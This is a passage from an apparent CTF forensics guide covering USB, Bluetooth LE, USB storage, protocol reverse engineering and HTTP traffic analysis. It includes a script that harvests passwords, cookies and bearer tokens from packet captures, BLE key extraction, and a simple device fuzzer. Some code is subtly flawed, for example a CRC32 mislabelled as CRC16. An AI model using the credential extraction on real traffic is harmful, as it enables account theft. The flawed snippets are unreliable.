                  f'-T fields -e usb.capdata | tr -d ":" | '
                  f'xxd -r -p > /tmp/serial.bin')
        
        # Analyze serial data
        with open('/tmp/serial.bin', 'rb') as f:
            data = f.read()
            print(f"[*] Extracted {len(data)} bytes")
            
            # Try text decode
            try:
                text = data.decode('ascii', errors='replace')
                print("\n[*] ASCII decode:")
                print(text[:500])
            except:
                pass
    
    # 3. Search for flags
    print("\n[*] Searching for flags...")
    os.system(f'tshark -r {pcap_file} -T fields -e usb.capdata | '
              f'tr -d ":" | xxd -r -p 2>/dev/null | '
              f'grep -aoE "(flag|ctf|htb){{[^}}]+}}" -i || echo "No flags found in direct search"')
    
    print("\n[*] Analysis complete")

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <capture.pcap>")
        sys.exit(1)
    
    analyze_capture(sys.argv[1])
```

---

**Related CTF Topics:** Protocol reverse engineering, binary data analysis, timing attack detection, hardware security fundamentals, firmware extraction from USB captures

---

## Bluetooth Traffic (BTLE)

Bluetooth Low Energy (BTLE/BLE) operates on 2.4 GHz ISM band with 37-40 advertising channels. CTF challenges involving BTLE require capture, decoding, and protocol analysis.

### BTLE Capture and Preliminary Analysis

BTLE capture requires compatible hardware. Linux supports various Bluetooth adapters through BlueZ stack. Verify capability:

```bash
## Check Bluetooth adapter
hciconfig
hcitool dev

## List supported modes (must include LE for BTLE)
hciconfig hci0
```

Dedicated BTLE sniffers (Ubertooth, nRF52840 dongle with Wireshark plugin) provide superior capture. Standard Linux Bluetooth adapter capture:

```bash
## Enable monitor mode for BTLE
sudo btmon > btmon_capture.log &

## Alternatively, use hcidump with raw output
sudo hcidump -i hci0 -R > hcidump_raw.log &

## Capture BTLE advertisements
sudo hcitool lescan --duplicates > ble_devices.txt &
sleep 30
pkill -f lescan
```

Standard method: use `wireshark` with Bluetooth adapter. Select "Bluetooth" interface, set capture filter `btle`:

```bash
## Capture BTLE to PCAP via command line
timeout 60 tshark -i bluetooth -Y btle -w ble_capture.pcap

## Parse captured BTLE packets
tshark -r ble_capture.pcap -Y btle -V | head -100
```

### BTLE Packet Structure Analysis

BTLE packets contain advertising data, connection requests, and encrypted payloads. Examine structure:

```bash
## View all BTLE advertising packets
tshark -r ble_capture.pcap -Y "btle.advertising_address" -T fields -e frame.number -e btle.advertising_address -e btle.adv_type

## Extract advertising data (where flags and UUIDs appear)
tshark -r ble_capture.pcap -Y "btle.advertising_address" -T fields -e btle.advertising_address -e data.data

## Connection parameters
tshark -r ble_capture.pcap -Y "btle.llid == 3" -T fields -e btle.scan_req.scanner_address -e btle.scan_resp.advertiser_address
```

BTLE advertising data encoding (AD structures) contains flags, UUIDs, names:

```bash
## Extract and parse AD structures
python3 << 'EOF'
import subprocess

result = subprocess.run(['tshark', '-r', 'ble_capture.pcap', '-Y', 'btle.advertising_address', '-T', 'fields', '-e', 'data.data'],
                       capture_output=True, text=True)

for line in result.stdout.strip().split('\n'):
    if not line:
        continue
    
    data = bytes.fromhex(line)
    offset = 0
    
    while offset < len(data):
        length = data[offset]
        if length == 0 or offset + length + 1 > len(data):
            break
        
        ad_type = data[offset + 1]
        ad_data = data[offset + 2:offset + 1 + length]
        
        if ad_type == 0x01:  ## Flags
            print(f"Flags: {ad_data.hex()}")
        elif ad_type == 0x09:  ## Complete Local Name
            print(f"Name: {ad_data.decode(errors='ignore')}")
        elif ad_type == 0x03 or ad_type == 0x04:  ## UUID
            print(f"UUID: {ad_data.hex()}")
        else:
            print(f"Type 0x{ad_type:02x}: {ad_data.hex()}")
        
        offset += length + 1
EOF
```

### BTLE Device Identification and Enumeration

Extract device MAC addresses, names, and UUIDs:

```bash
## List unique BTLE devices
tshark -r ble_capture.pcap -Y "btle.advertising_address" -T fields -e btle.advertising_address | sort -u

## Device names from scan responses
tshark -r ble_capture.pcap -Y "btle.adv_type == 4" -T fields -e btle.advertising_address -e data.data | while read mac data; do
  if [ -n "$data" ]; then
    ## Parse AD structure for name (type 0x09)
    echo "MAC: $mac"
    echo "$data" | xxd -r -p | strings
  fi
done

## GATT services (if connection established and services discovered)
tshark -r ble_capture.pcap -Y "btle.gatt.handle" -T fields -e btle.gatt.uuid -e btle.gatt.handle | sort -u
```

### BTLE Connection and Pairing Analysis

When devices pair, encryption keys exchange. CTF challenges may require key recovery:

```bash
## Pairing exchange packets
tshark -r ble_capture.pcap -Y "btle.smp" -T fields -e frame.number -e btle.smp.opcode

## Pairing request/response
tshark -r ble_capture.pcap -Y "btle.smp.opcode == 1 or btle.smp.opcode == 2" -V | grep -A10 "Pairing Request\|Pairing Response"

## Long-Term Key (LTK) and other keys
tshark -r ble_capture.pcap -Y "btle.smp" -T fields -e btle.smp.ltk -e btle.smp.irk -e btle.smp.csrk
```

**Known vulnerability**: If challenge provides pairing codes or uses insecure pairing (Just Works), extract keys:

```bash
python3 << 'EOF'
import subprocess

## Extract pairing packets in sequence
result = subprocess.run(['tshark', '-r', 'ble_capture.pcap', '-Y', 'btle.smp', '-V'],
                       capture_output=True, text=True)

lines = result.stdout.split('\n')
pairing_data = {}

for i, line in enumerate(lines):
    if 'Pairing Request' in line:
        ## Extract initiator characteristics
        for j in range(i, min(i+20, len(lines))):
            if 'IO Capability' in lines[j]:
                print(f"Initiator IO: {lines[j]}")
    elif 'Pairing Response' in line:
        for j in range(i, min(i+20, len(lines))):
            if 'IO Capability' in lines[j]:
                print(f"Responder IO: {lines[j]}")
EOF
```

### BTLE Encrypted Communication

BTLE uses AES-CCM encryption after connection. If keys unavailable, attempt key recovery from known plaintext or side-channel:

```bash
## Encrypted packets (LLID indicates data)
tshark -r ble_capture.pcap -Y "btle.llid == 2 or btle.llid == 3" -T fields -e frame.number -e data.data | wc -l

## If plaintext operations precede encryption, correlate packet structure
## Example: GATT write before encryption, then encrypted packets with same length
tshark -r ble_capture.pcap -Y "btle.gatt.write" -T fields -e data.data

## Use braktooth or similar BTLE fuzzer to test encryption state
## (Advanced: not typical in basic CTFs)
```

### BTLE GATT Service and Characteristic Enumeration

Generic Attribute Profile (GATT) defines services and characteristics:

```bash
## List GATT services discovered
tshark -r ble_capture.pcap -Y "btle.gatt.service_uuid" -T fields -e btle.gatt.service_uuid | sort -u

## List characteristics
tshark -r ble_capture.pcap -Y "btle.gatt.characteristic_uuid" -T fields -e btle.gatt.characteristic_uuid -e btle.gatt.handle | sort -u

## Characteristic values (if readable)
tshark -r ble_capture.pcap -Y "btle.gatt.read_response" -T fields -e btle.gatt.value

## Write operations (data sent to device)
tshark -r ble_capture.pcap -Y "btle.gatt.write_request or btle.gatt.write_command" -T fields -e btle.gatt.handle -e data.data
```

Python GATT interaction for real-time device testing:

```bash
## Use bluepy or bleak library to interact with BTLE devices
pip install bluepy bleak

python3 << 'EOF'
from bleak import BleakClient
import asyncio

async def explore_device():
    device_address = "AA:BB:CC:DD:EE:FF"  ## From PCAP or device scan
    
    async with BleakClient(device_address) as client:
        ## List services
        for service in client.services:
            print(f"Service: {service.uuid}")
            for char in service.characteristics:
                print(f"  Characteristic: {char.uuid}")
                if 'read' in char.properties:
                    try:
                        value = await client.read_gatt_char(char.uuid)
                        print(f"    Value: {value.hex()}")
                    except:
                        pass

asyncio.run(explore_device())
EOF
```

### BTLE Advertising Channel Frequency Hopping

BTLE alternates between advertising channels 37, 38, 39 (2402, 2426, 2480 MHz). Wireshark displays channel:

```bash
## Packets on each advertising channel
tshark -r ble_capture.pcap -Y "btle.advertising_address" -T fields -e btle.channel | sort | uniq -c

## Data channel hopping (after connection)
tshark -r ble_capture.pcap -Y "btle.data" -T fields -e btle.channel | sort | uniq -c
```

Channel hopping patterns may reveal connection parameters or synchronization data used in challenges.

---

## USB Storage Forensics

USB storage devices appear in PCAP as URB (USB Request Block) packets. Extracting and analyzing USB traffic recovers files and identifies data exfiltration.

### USB Capture Prerequisites

USB traffic capture requires Linux host with hardware support. Verify:

```bash
## Check for usbmon (USB monitoring) kernel module
lsmod | grep usbmon
sudo modprobe usbmon

## List USB buses
lsusb
lsusb -t

## Identify bus number for target device
lsusb | grep "Mass Storage\|Storage Device"
## Output example: Bus 001 Device 002: ID 0781:5581 SanDisk Corp. Cruzer U3
## Bus 001 = usbmon1
```

Capture USB traffic to PCAP:

```bash
## Capture all USB traffic on bus 1
timeout 120 tcpdump -i usbmon1 -w usb_capture.pcap

## Alternative: use Wireshark with USB interface selected
wireshark -i usbmon1

## Filter during capture (optional, slows capture)
timeout 120 tcpdump -i usbmon1 "usb.transfer_type == 31" -w usb_storage.pcap
```

### USB Device Enumeration from PCAP

Extract device information from USB descriptors:

```bash
## List USB devices (vendor/product IDs)
tshark -r usb_capture.pcap -Y "usb.descriptor_type == 1" -T fields -e usb.idVendor -e usb.idProduct -e usb.iManufacturer -e usb.iProduct

## Device configuration details
tshark -r usb_capture.pcap -Y "usb.descriptor_type == 2" -V | grep -E "bConfigurationValue|bNumInterfaces|wTotalLength"

## Endpoint information (where data transfers occur)
tshark -r usb_capture.pcap -Y "usb.descriptor_type == 5" -T fields -e usb.bEndpointAddress -e usb.bmAttributes -e usb.wMaxPacketSize
```

### USB Mass Storage Protocol Analysis

USB storage devices use SCSI commands encapsulated in USB. Decode command sequence:

```bash
## Identify SCSI commands (CBW = Command Block Wrapper)
tshark -r usb_capture.pcap -Y "usb.transfer_type == 3" -T fields -e usb.capdata | head -20

## SCSI commands: 0x28=READ, 0x2A=WRITE, 0x03=REQUEST_SENSE, 0x12=INQUIRY
python3 << 'EOF'
import subprocess

result = subprocess.run(['tshark', '-r', 'usb_capture.pcap', '-Y', 'usb.transfer_type == 3', '-T', 'fields', '-e', 'usb.capdata'],
                       capture_output=True, text=True)

for line in result.stdout.strip().split('\n'):
    if not line:
        continue
    
    ## CBW structure: 4-byte signature (55534243), 4-byte tag, 4-byte data length, 
    ## direction flag, LUN, length, SCSI command
    data = bytes.fromhex(line)
    
    if len(data) >= 16:
        signature = data[0:4].hex()
        tag = data[4:8].hex()
        data_length = int.from_bytes(data[8:12], 'little')
        direction = data[12]  ## 0x80=IN, 0x00=OUT
        lun = data[13]
        cmd_length = data[14]
        scsi_cmd = data[15] if len(data) > 15 else 0
        
        cmd_names = {
            0x03: 'REQUEST_SENSE',
            0x12: 'INQUIRY',
            0x25: 'READ_CAPACITY',
            0x28: 'READ_10',
            0x2A: 'WRITE_10',
            0x2E: 'WRITE_AND_VERIFY',
        }
        
        cmd_name = cmd_names.get(scsi_cmd, f'0x{scsi_cmd:02x}')
        dir_name = 'IN' if direction == 0x80 else 'OUT'
        
        print(f"SCSI {cmd_name} ({dir_name}): {data_length} bytes")
EOF
```

### USB Data Transfer Extraction

Extract actual file data from USB storage reads:

```bash
## Identify READ commands and following data transfers
tshark -r usb_capture.pcap -Y "usb" -T fields -e frame.number -e usb.bmRequestType -e usb.bRequest -e usb.capdata | grep -E "READ|WRITE"

## Extract IN transfers (data from device)
tshark -r usb_capture.pcap -Y "usb.direction == 1" -T fields -e usb.capdata > usb_data_in.hex

## Convert to binary
python3 << 'EOF'
with open('usb_data_in.hex', 'r') as f:
    with open('usb_data_extracted.bin', 'wb') as out:
        for line in f:
            if line.strip():
                ## Skip non-hex lines
                try:
                    data = bytes.fromhex(line.strip())
                    out.write(data)
                except:
                    pass
EOF

## Analyze extracted data
file usb_data_extracted.bin
hexdump -C usb_data_extracted.bin | head -20
strings usb_data_extracted.bin | head -30
```

### USB Storage Mount and Filesystem Recovery

If PCAP contains complete filesystem image:

```bash
## Attempt to mount if valid filesystem signature detected
file usb_data_extracted.bin

## Mount as loopback device
sudo mkdir -p /mnt/usb_recovery
sudo mount -o ro,noexec usb_data_extracted.bin /mnt/usb_recovery

## List files
ls -la /mnt/usb_recovery

## Search for flags or suspicious files
find /mnt/usb_recovery -type f -exec strings {} \; | grep -i 'flag\|ctf'

## Unmount
sudo umount /mnt/usb_recovery
```

Filesystem recovery tools for corrupted/incomplete images:

```bash
## PhotoRec for deleted file recovery
photorec usb_data_extracted.bin

## Foremost for carving
foremost -i usb_data_extracted.bin -o /tmp/foremost_output

## Scalpel (advanced carving)
scalpel -i usb_data_extracted.bin -o /tmp/scalpel_output
```

### Deleted File Recovery from USB

PCAP may capture multiple overwrites or deletions. Carve data from unallocated sectors:

```bash
## Identify deleted file signatures (headers and trailers)
strings usb_data_extracted.bin | grep -E "^\\xff\\xd8\\xff|^%PDF|^PK\x03\x04"  ## JPEG, PDF, ZIP headers

## Use strings + grep to find recognizable patterns
hexdump -C usb_data_extracted.bin | grep -E "^[0-9a-f]+ +4a 46 49 46|^[0-9a-f]+ +25 50 44 46"  ## JFIF/PDF

## Advanced: use binwalk to identify embedded files
binwalk -e usb_data_extracted.bin
```

### USB Partition Table and Filesystem Analysis

Extract partition information:

```bash
## Parse MBR (first 512 bytes)
hexdump -C usb_data_extracted.bin | head -32

## Extract partition entries (offset 0x1BE, 16 bytes each)
python3 << 'EOF'
with open('usb_data_extracted.bin', 'rb') as f:
    data = f.read()
    
    ## Signature check
    if data[510:512] == b'\x55\xaa':
        print("Valid MBR signature")
        
        ## Parse 4 partition entries
        for i in range(4):
            offset = 0x1BE + i * 16
            entry = data[offset:offset+16]
            
            bootable = entry[0] & 0x80
            type_id = entry[4]
            start_lba = int.from_bytes(entry[8:12], 'little')
            sectors = int.from_bytes(entry[12:16], 'little')
            
            print(f"Partition {i}: Type=0x{type_id:02x}, Start LBA={start_lba}, Size={sectors} sectors")
EOF

## FAT32 filesystem check
hexdump -C usb_data_extracted.bin | grep -E "4641 5433|0xEB"  ## FAT32 signature

## NTFS filesystem check
hexdump -C usb_data_extracted.bin | grep "4E 54 46 53"  ## NTFS signature
```

---

## Hardware Protocol Reverse Engineering

CTF challenges may involve proprietary or obfuscated protocols. Systematic reverse engineering extracts meaning from network traffic.

### Protocol Structure Discovery

Identify protocol boundaries and message types:

```bash
## Capture traffic from hardware interaction
## Example: Capture multiple identical device commands (e.g., read register repeatedly)

## Length analysis: identify message headers and checksums
python3 << 'EOF'
import subprocess

result = subprocess.run(['tcpdump', '-r', 'hardware_traffic.pcap', '-X', '-w', '-'],
                       capture_output=True, text=True)

## Parse packets and look for repetitive structure
packets = []
for line in result.stdout.split('\n'):
    if line.startswith('\t'):
        ## Extract hex dump
        hex_part = ''.join(line.split()[1:])
        packets.append(hex_part)

## Find common patterns
if packets:
    print(f"Packet 1: {packets[0]}")
    print(f"Packet 2: {packets[1]}")
    print(f"Common prefix: {packets[0][:min(len(packets[0]), len(packets[1]))]}")
EOF
```

### State Machine Mapping

Observe device behavior across multiple commands. Identify states and transitions:

```bash
## Capture entire interaction sequence
timeout 300 tcpdump -i eth0 -w hardware_sequence.pcap "host 192.168.1.100"

## Timeline of packets
tshark -r hardware_sequence.pcap -T fields -e frame.time_relative -e ip.src -e ip.dst -e tcp.dstport -e data.data | head -50

## Identify command-response pairs
python3 << 'EOF'
import subprocess
from collections import defaultdict

result = subprocess.run(['tshark', '-r', 'hardware_sequence.pcap', '-T', 'fields', '-e', 'frame.time_relative', '-e', 'ip.src', '-e', 'ip.dst', '-e', 'data.data'],
                       capture_output=True, text=True)

state = 'IDLE'
commands = []

for line in result.stdout.strip().split('\n'):
    parts = line.split('\t')
    if len(parts) >= 4:
        time, src, dst, data = parts[0], parts[1], parts[2], parts[3]
        
        if data:
            commands.append({
                'time': time,
                'src': src,
                'dst': dst,
                'data': data,
                'state': state
            })
            
            ## Simple state tracking: if large response received, state changed
            if len(data) > 100:
                state = 'RECEIVING'
            else:
                state = 'SENDING'

for cmd in commands:
    print(f"{cmd['time']}: {cmd['state']} | {cmd['src']} → {cmd['dst']} | {cmd['data'][:32]}")
EOF
```

### Protocol Field Identification

Distinguish between header, payload, and footer fields:

```bash
python3 << 'EOF'
def analyze_protocol_structure(packet_hex):
    """
    Hypothesize protocol structure based on repeated messages
    """
    data = bytes.fromhex(packet_hex)
    
    ## Common patterns:
    ## - First 2-4 bytes: magic/type/version
    ## - Next bytes: length field
    ## - Middle: payload
    ## - Last bytes: checksum/CRC
    
    print(f"Packet length: {len(data)}")
    print(f"First 4 bytes (magic/header): {data[:4].hex()}")
    
    ## Test if 2nd-3rd bytes encode length
    potential_length = int.from_bytes(data[1:3], 'big')
    if potential_length == len(data) - 4:
        print(f"Likely length field at offset 1-3: {potential_length}")
    
    ## Test last 2 bytes for CRC16
    payload = data[:-2]
    possible_crc = int.from_bytes(data[-2:], 'little')
    print(f"Possible CRC/checksum: 0x{possible_crc:04x}")
    
    ## Payload content analysis
    print(f"Payload: {data[4:-2].hex()}")

## Test with captured packets
packet1 = "48656c6c6f20576f726c6421"  ## Example
analyze_protocol_structure(packet1)
EOF
```

### Checksum and CRC Verification

Identify checksum algorithm by testing known values:

```bash
python3 << 'EOF'
def test_checksum(data_hex, suspected_checksum_hex):
    """Test various checksum algorithms"""
    data = bytes.fromhex(data_hex)
    suspected = int(suspected_checksum_hex, 16)
    
    ## Simple XOR
    xor_result = 0
    for b in data:
        xor_result ^= b
    if xor_result == (suspected & 0xFF):
        print(f"✓ XOR checksum: 0x{xor_result:02x}")
    
    ## Simple SUM
    sum_result = sum(data) & 0xFF
    if sum_result == (suspected & 0xFF):
        print(f"✓ SUM checksum: 0x{sum_result:02x}")
    
    ## CRC16-CCITT
    import zlib
    crc16_result = zlib.crc32(data) & 0xFFFF
    if crc16_result == suspected:
        print(f"✓ CRC16-CCITT: 0x{crc16_result:04x}")
    
    ## CRC32
    crc32_result = zlib.crc32(data) & 0xFFFFFFFF
    if crc32_result == suspected:
        print(f"✓ CRC32: 0x{crc32_result:08x}")
    
    print(f"Data: {data_hex}")
    print(f"Suspected checksum: {suspected_checksum_hex}")

## From captured traffic: extract payload and checksum
test_checksum("48656c6c6f", "8f")  ## "Hello" with checksum 0x8f
EOF
```

### Encryption Detection and Key Search

Identify encrypted sections using entropy analysis:

```bash
python3 << 'EOF'
import math

def shannon_entropy(data):
    """Calculate Shannon entropy"""
    if len(data) == 0:
        return 0
    freq = {}
    for byte in data:
        freq[byte] = freq.get(byte, 0) + 1
    
    entropy = 0
    for count in freq.values():
        p = count / len(data)
        entropy -= p * math.log2(p)
    
    return entropy

## Test packets for encrypted sections
import subprocess
result = subprocess.run(['tshark', '-r', 'hardware_traffic.pcap', '-T', 'fields', '-e', 'data.data'],
                       capture_output=True, text=True)

for i, line in enumerate(result.stdout.strip().split('\n')):
    if not line:
        continue
    
    data = bytes.fromhex(line)
    entropy = shannon_entropy(data)
    
    ## High entropy (7.5-8.0) suggests encryption/compression
    if entropy > 7.0:
        print(f"Packet {i}: HIGH ENTROPY ({entropy:.2f}) - possibly encrypted")
    elif entropy < 4.0:
        print(f"Packet {i}: LOW ENTROPY ({entropy:.2f}) - likely structured/text")
    else:
        print(f"Packet {i}: MEDIUM ENTROPY ({entropy:.2f})")
EOF
```

### Protocol Fuzzing for Discovery

Test unknown device behavior with varied inputs to identify valid commands and states:

```bash
## Basic fuzzing with tshark/netcat
## Warning: May damage device or trigger protective mechanisms

## Send iterative byte patterns
python3 << 'EOF'
import socket
import time

def fuzz_device(host, port):
    ## Test simple patterns
    patterns = [
        b'\x00' * 16,           ## All zeros
        b'\xff' * 16,           ## All ones
        b'\x01\x02\x03\x04',    ## Sequential
        b'HELLO_WORLD_0000',     ## ASCII pattern
    ]
    
    for pattern in patterns:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((host, port))
            sock.send(pattern)
            response = sock.recv(1024)
            print(f"Sent: {pattern.hex()}")
            print(f"Response: {response.hex()}")
            sock.close()
            time.sleep(0.5)
        except Exception as e:
            print(f"Error: {e}")

## fuzz_device('192.168.1.100', 5000)
EOF
```

### Protocol Documentation via Comparative Analysis

Compare similar commands to deduce field meanings:

```bash
python3 << 'EOF'
def compare_commands(cmd1, cmd2, description):
    """Highlight differences between similar commands"""
    data1 = bytes.fromhex(cmd1)
    data2 = bytes.fromhex(cmd2)
    
    print(f"Command comparison: {description}")
    print(f"CMD1: {cmd1}")
    print(f"CMD2: {cmd2}")
    print(f"Length: {len(data1)} vs {len(data2)}")
    
    if len(data1) == len(data2):
        differences = []
        for i, (b1, b2) in enumerate(zip(data1, data2)):
            if b1 != b2:
                differences.append(f"Offset {i}: 0x{b1:02x} → 0x{b2:02x}")
        
        if differences:
            print("Differences:")
            for diff in differences:
                print(f"  {diff}")
        else:
            print("No differences (likely same base command)")
    else:
        print("Different lengths - may be different command types")

## Example: Compare READ register 0x10 vs READ register 0x20
compare_commands(
    "aa0010ffff0000beef",  ## Hypothetical: header + register addr 0x10 + footer
    "aa0020ffff0000beef",  ## Same but address 0x20
    "READ different register addresses"
)
EOF
```

[Inference] Protocol reverse engineering from traffic requires iterative hypothesis testing. Initial observations (packet length, repeated patterns, timing) suggest structure. Testing through command variation and checksum verification refines understanding progressively.

---

# Application Layer Analysis

Application layer analysis focuses on examining protocols and data exchanges at OSI Layer 7, where user-facing applications communicate. In CTF scenarios, this layer often contains flags, credentials, session tokens, and exploitable vulnerabilities hidden in legitimate-looking traffic.

## Web Application Traffic

Web application traffic analysis involves dissecting HTTP/HTTPS communications to identify security issues, extract sensitive data, and understand application behavior.

### HTTP Protocol Fundamentals

**HTTP request structure:**

```
GET /path/resource?param=value HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Accept: text/html
Cookie: session=abc123
Authorization: Bearer token123

[Optional request body]
```

**HTTP response structure:**

```
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: session=xyz789
Content-Length: 1234

[Response body]
```

### Traffic Capture and Extraction

**Tshark HTTP analysis:**

```bash
# Extract all HTTP requests
tshark -r capture.pcap -Y "http.request" -T fields \
    -e frame.number \
    -e ip.src \
    -e http.request.method \
    -e http.request.uri \
    -e http.host

# Extract HTTP responses
tshark -r capture.pcap -Y "http.response" -T fields \
    -e frame.number \
    -e http.response.code \
    -e http.content_type \
    -e http.content_length

# Extract specific headers
tshark -r capture.pcap -Y "http" -T fields \
    -e http.cookie \
    -e http.authorization \
    -e http.user_agent

# Extract POST data
tshark -r capture.pcap -Y "http.request.method == POST" -T fields \
    -e http.request.uri \
    -e http.file_data

# Extract URLs with parameters
tshark -r capture.pcap -Y "http.request" -T fields \
    -e http.request.full_uri | sort -u
```

**Export HTTP objects:**

```bash
# Export all HTTP objects
tshark -r capture.pcap --export-objects http,./http_objects

# List HTTP objects without exporting
tshark -r capture.pcap --export-objects http,/dev/null 2>&1 | grep "Exported"

# Export specific content types
tshark -r capture.pcap -Y "http.content_type contains \"image\"" \
    --export-objects http,./images
```

**Wireshark HTTP analysis:**

```
# Display filters
http                                    # All HTTP traffic
http.request                            # HTTP requests only
http.response                           # HTTP responses only
http.request.method == "POST"           # POST requests
http.response.code == 200               # Successful responses
http.cookie contains "session"          # Cookies with "session"
http.authorization                      # Authorization headers
http.request.uri contains "admin"       # Admin endpoints
http.file_data contains "password"      # POST data with passwords

# Follow HTTP stream
Right-click packet → Follow → HTTP Stream

# Export HTTP objects
File → Export Objects → HTTP
```

### Credential Extraction

**Extract authentication data:**

```bash
# Basic authentication
tshark -r capture.pcap -Y "http.authbasic" -T fields \
    -e http.authbasic | base64 -d

# Extract all Authorization headers
tshark -r capture.pcap -Y "http.authorization" -T fields \
    -e http.authorization

# Extract login POST requests
tshark -r capture.pcap -Y "http.request.method == POST && \
    (http.request.uri contains \"login\" || http.request.uri contains \"auth\")" \
    -T fields -e http.file_data

# Extract cookies
tshark -r capture.pcap -Y "http.cookie" -T fields \
    -e http.cookie -e ip.src | sort -u
```

**Python credential extraction script:**

```python
#!/usr/bin/env python3
from scapy.all import *
import base64
import re
from urllib.parse import unquote, parse_qs

def extract_credentials(pcap_file):
    pkts = rdpcap(pcap_file)
    credentials = []
    
    for pkt in pkts:
        if TCP in pkt and Raw in pkt:
            try:
                payload = pkt[Raw].load.decode('utf-8', errors='ignore')
                
                # Check for HTTP traffic
                if payload.startswith(('GET ', 'POST ', 'HTTP/')):
                    lines = payload.split('\r\n')
                    
                    # Extract Basic Authentication
                    for line in lines:
                        if line.startswith('Authorization: Basic '):
                            encoded = line.split('Basic ')[1].strip()
                            try:
                                decoded = base64.b64decode(encoded).decode('utf-8')
                                print(f"[+] Basic Auth: {decoded}")
                                credentials.append(('basic', decoded))
                            except:
                                pass
                        
                        # Extract Bearer tokens
                        elif line.startswith('Authorization: Bearer '):
                            token = line.split('Bearer ')[1].strip()
                            print(f"[+] Bearer Token: {token}")
                            credentials.append(('bearer', token))
                        
                        # Extract cookies
                        elif line.startswith('Cookie: '):
                            cookie = line.split('Cookie: ')[1].strip()
                            print(f"[+] Cookie: {cookie}")
                            credentials.append(('cookie', cookie))
                    
                    # Extract POST data
                    if 'POST ' in payload:
                        # Find body (after double CRLF)
                        if '\r\n\r\n' in payload:
                            body = payload.split('\r\n\r\n', 1)[1]
                            
                            # Parse form data
                            if 'username=' in body or 'password=' in body or 'email=' in body:
                                print(f"[+] POST Data: {body[:200]}")
                                
                                # URL decode
                                decoded_body = unquote(body)
                                
                                # Extract credentials with regex
                                usernames = re.findall(r'(?:user(?:name)?|login|email)=([^&\s]+)', decoded_body, re.I)
                                passwords = re.findall(r'(?:pass(?:word)?|pwd)=([^&\s]+)', decoded_body, re.I)
                                
                                if usernames and passwords:
                                    for u, p in zip(usernames, passwords):
                                        print(f"    Username: {u}")
                                        print(f"    Password: {p}")
                                        credentials.append(('form', f"{u}:{p}"))
            except:
                pass
    
    return credentials

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: ./extract_creds.py capture.pcap")
        sys.exit(1)
    
    creds = extract_credentials(sys.argv[1])
    
    # Save to file
    with open('credentials.txt', 'w') as f:
        for cred_type, cred in creds:
            f.write(f"[{cred_type}] {cred}\n")
    
    print(f"\n[*] Extracted {len(creds)} credentials to credentials.txt")
```

### Session Token Analysis

**Extract session tokens:**

```bash
# Extract Set-Cookie headers (server → client)
tshark -r capture.pcap -Y "http.set_cookie" -T fields \
    -e frame.time -e ip.dst -e http.set_cookie

# Extract Cookie headers (client → server)
tshark -r capture.pcap -Y "http.cookie" -T fields \
    -e frame.time -e ip.src -e http.cookie

# Track session token changes
tshark -r capture.pcap -Y "http.set_cookie contains \"session\"" -T fields \
    -e frame.time -e http.set_cookie | sort
```

**Session hijacking analysis:**

```python
#!/usr/bin/env python3
from scapy.all import *
from collections import defaultdict
import re

def analyze_sessions(pcap_file):
    pkts = rdpcap(pcap_file)
    sessions = defaultdict(list)  # IP -> list of session tokens
    
    for pkt in pkts:
        if TCP in pkt and Raw in pkt:
            try:
                payload = pkt[Raw].load.decode('utf-8', errors='ignore')
                
                # Extract session cookies
                if 'Cookie:' in payload:
                    ip_src = pkt[IP].src if IP in pkt else 'unknown'
                    
                    # Find session tokens
                    session_match = re.search(r'session(?:id)?=([^;\s]+)', payload, re.I)
                    if session_match:
                        token = session_match.group(1)
                        timestamp = float(pkt.time)
                        sessions[ip_src].append((timestamp, token))
                        
                # Extract Set-Cookie
                elif 'Set-Cookie:' in payload:
                    ip_dst = pkt[IP].dst if IP in pkt else 'unknown'
                    session_match = re.search(r'session(?:id)?=([^;\s]+)', payload, re.I)
                    if session_match:
                        token = session_match.group(1)
                        timestamp = float(pkt.time)
                        print(f"[*] Session created for {ip_dst}: {token}")
            except:
                pass
    
    # Analyze session usage
    print("\n[*] Session Token Analysis:")
    for ip, tokens in sessions.items():
        print(f"\n[+] Client: {ip}")
        unique_tokens = set(t[1] for t in tokens)
        print(f"    Total requests: {len(tokens)}")
        print(f"    Unique tokens: {len(unique_tokens)}")
        
        if len(unique_tokens) > 1:
            print(f"    [!] Multiple session tokens detected (possible hijacking)")
            for token in unique_tokens:
                print(f"        - {token}")
        
        # Check for token reuse across IPs
        for other_ip, other_tokens in sessions.items():
            if other_ip != ip:
                shared = unique_tokens.intersection(set(t[1] for t in other_tokens))
                if shared:
                    print(f"    [!] Shared tokens with {other_ip}:")
                    for token in shared:
                        print(f"        - {token}")

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: ./analyze_sessions.py capture.pcap")
        sys.exit(1)
    
    analyze_sessions(sys.argv[1])
```

### HTTP Method Analysis

**Identify REST API patterns:**

```bash
# Count HTTP methods
tshark -r capture.pcap -Y "http.request" -T fields \
    -e http.request.method | sort | uniq -c | sort -rn

# Find uncommon methods (PUT, DELETE, PATCH)
tshark -r capture.pcap -Y "http.request.method == PUT || \
    http.request.method == DELETE || \
    http.request.method == PATCH" -T fields \
    -e http.request.method -e http.request.uri

# Extract OPTIONS requests (API discovery)
tshark -r capture.pcap -Y "http.request.method == OPTIONS" -T fields \
    -e http.request.uri -e http.allow
```

### Response Analysis

**Status code analysis:**

```bash
# Count response codes
tshark -r capture.pcap -Y "http.response" -T fields \
    -e http.response.code | sort | uniq -c | sort -rn

# Find error responses (4xx, 5xx)
tshark -r capture.pcap -Y "http.response.code >= 400" -T fields \
    -e frame.time -e http.request.uri -e http.response.code

# Find redirects (3xx)
tshark -r capture.pcap -Y "http.response.code >= 300 && \
    http.response.code < 400" -T fields \
    -e http.request.uri -e http.response.code -e http.location

# Unauthorized access attempts
tshark -r capture.pcap -Y "http.response.code == 401 || \
    http.response.code == 403" -T fields \
    -e ip.src -e http.request.uri
```

**Content-Type analysis:**

```bash
# List all content types
tshark -r capture.pcap -Y "http.content_type" -T fields \
    -e http.content_type | sort -u

# Find JSON responses
tshark -r capture.pcap -Y "http.content_type contains \"json\"" -T fields \
    -e http.request.uri -e http.file_data

# Find XML responses
tshark -r capture.pcap -Y "http.content_type contains \"xml\"" -T fields \
    -e http.request.uri -e http.file_data

# Find file downloads
tshark -r capture.pcap -Y "http.content_disposition" -T fields \
    -e http.content_disposition -e http.content_type
```

